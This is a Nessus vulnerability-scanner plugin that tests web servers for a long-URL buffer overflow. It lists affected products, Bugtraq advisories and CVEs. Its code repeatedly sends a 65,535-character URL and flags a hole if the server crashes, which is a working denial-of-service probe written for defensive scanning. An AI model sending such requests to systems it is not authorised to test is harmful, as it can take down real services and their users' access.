#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Some vulnerable servers:
# SmallHTTP (All versions vulnerable: 2.x Stables, 3.x Latest beta 8)
# OmniHTTPd v2.09 of Omnicron (www.omnicron.ca)
# MyWebServer 1.02
# atphttpd-0.4b ?
# IBM Tivoli Management Framework < Currently Fixpack 2 or Patches
#  3.7.1-TMF-0066
#  LCFD process - default port 9495)
# IBM Tivoli Management Framework 3.6.x through 3.7.1 (fixed in 4.1)
#  Spider process - default port 94 redirected to another port.
# Access Point IP Services Router (Formerly known as Xedia Router)
# Oracle9iAS Web Cache/2.0.0.1.0
# TelCondex SimpleWebServer 2.06.20817 Build 3128
# Polycom ViaVideo 2.2 & 3.0
# WebServer 4 Everyone
# WebServer 4 Everyone v1.28 (if Host field is set)
# Savant Web Server 3.1 and previous
# WN Server 1.18.2 through 2.0.0 (upgrade to 2.4.4)
# Multitech RouteFinder 550 VPN  (upgrade to RF550VPN_V463)
# Web Server 4D/eCommerce 3.5.3
# ZBServer Pro 1.50-r13
# BRS WebWeaver 1.03
# U.S. Robotics Broadband-Router 8000A/8000-2 (USR848000A-02) running firmware 
# version 2.5 
# Polycomm ViaVideo Web component 2.2 & 3.0
# GazTek HTTP Daemon v1.4-3
# WebFS 1.20
# UltraVNC <= 1.0.1
# 
########################
# References:
########################
# Date: Sat, 12 Oct 2002 07:49:52 +0200
# From:"Marc Ruef" <marc.ruef@computec.ch>
# To:bugtraq@securityfocus.com
# Subject: Long URL crashes My Web Server 1.0.2
#
# Date: Sun, 13 Oct 2002 15:00:18 +0200
# From:"Marc Ruef" <marc.ruef@computec.ch>
# To:bugtraq@securityfocus.com
# Subject: Long URL causes TelCondex SimpleWebServer to crash
#
# Date: Mon, 14 Oct 2002 08:27:54 +1300 (NZDT)
# From:advisory@prophecy.net.nz
# To:bugtraq@securityfocus.com
# Subject: Security vulnerabilities in Polycom ViaVideo Web component
#
# From:"David Endler" <dendler@idefense.com>
# To:bugtraq@securityfocus.com
# Date: Tue, 15 Oct 2002 13:12:35 -0400
# Subject: iDEFENSE Security Advisory 10.15.02: DoS and Directory Traversal Vulnerabilities in WebServer 4 Everyone
#
# Delivered-To: mailing list vulnwatch@vulnwatch.org
# Date: Tue, 10 Sep 2002 15:39:02 -0700
# Message-ID: <9DC8A3D37E31E043BD516142594BDDFA017CA6FC@MISSION.foundstone.com>
# From: "Foundstone Labs" <labs@foundstone.com>
# To: "announce" <announce@foundstone.com>
# Subject: Foundstone Labs Advisory - Buffer Overflow in Savant Web Server
# 
# From:"David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Mon, 30 Sep 2002 10:09:59 -0400
# Subject: iDEFENSE Security Advisory 09.30.2002: Buffer Overflow in WN Server
#
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Web Server 4D/eCommerce 3.5.3 DoS Vulnerability
# Date: Tue, 15 Jan 2002 00:35:59 +0200
# Affiliation: http://www.securityoffice.net
#
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: ZBServer Pro DoS Vulnerability
# Date: Tue, 15 Jan 2002 04:44:37 +0200
# Affiliation: http://www.securityoffice.net
# 
# Date:	 Mon, 14 Oct 2002 08:27:54 +1300 (NZDT)
# From:	advisory@prophecy.net.nz
# To:	bugtraq@securityfocus.com
# Subject: Security vulnerabilities in Polycom ViaVideo Web component
#
# Date: Sat, 12 Oct 2002 17:02:31 -0700
# To: bugtraq@securityfocus.com
# Subject: Pyramid Research Project - ghttpd security advisorie
# From: pyramid-rp@hushmail.com
#
# Date: Tue Apr 04 2006 - 14:24:13 CDT
# To: bugtraq@securityfocus.com
# Subject: Buffer-overflow in Ultr@VNC 1.0.1 viewer and server
# From: Luigi Auriemma (aluigiautistici.org)
#
########################

if(description)
{
 script_id(10320);
 script_bugtraq_id(889, 1423, 2979, 6994, 7067, 7280, 8726, 17378);
 script_version ("$Revision: 1.53 $");
 script_cve_id(
  "CVE-2000-0002",
  "CVE-2000-0065",
  "CVE-2000-0571",
  "CVE-2001-1250",
  "CVE-2003-0125",
  "CVE-2003-0833",
  "CVE-2006-1652"
 );
 
 name["english"] = "Too long URL";
 name["francais"] = "URL trop longue";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote web server crashes when it receives a too long URL.

It might be possible to make it execute arbitrary code through this flaw.

Solution : Contact your vendor for a patch
Risk factor : High

Solution : Upgrade your web server.";

 desc["francais"] = "
 
Il est peut etre possible de faire executer du code arbitraire
à un serveur web en lui envoyant une URL trop longue.

Facteur de risque : Elevé

Solution : Mettez à jour votre serveur web.";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Web server buffer overflow";
 summary["francais"] = "Dépassement de buffer dans un serveur web";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL); 
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie('httpver.nasl', 'www_multiple_get.nasl');
 script_require_ports("Services/www",80);
 exit(0);
}

#
# The script code starts here
#

include('global_settings.inc');
include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


if(http_is_dead(port:port))exit(0);

# Try to avoid FP on CISCO 7940 phone
max = get_kb_item('www/multiple_get/'+port);
if (max)
{
 imax = max * 2 / 3;
 if (imax < 1)
  imax = 1;
 else if (imax > 5)
  imax = 5;
}
else
 imax = 5;
debug_print('imax=',imax,'\n');

# vWebServer and Small HTTP are vulnerable *if* the URL is requested 
# a couple of times. Ref: VULN-DEV & BUGTRAQ (2001-09-29)
for (i = 0; i < imax; i = i + 1)
{
 soc = http_open_socket(port);
 if(soc)
 {
 req = string("/", crap(65535));
 req = http_get(item:req, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 }
}


if(http_is_dead(port: port, retry:1))
{
	security_hole(port);
	set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
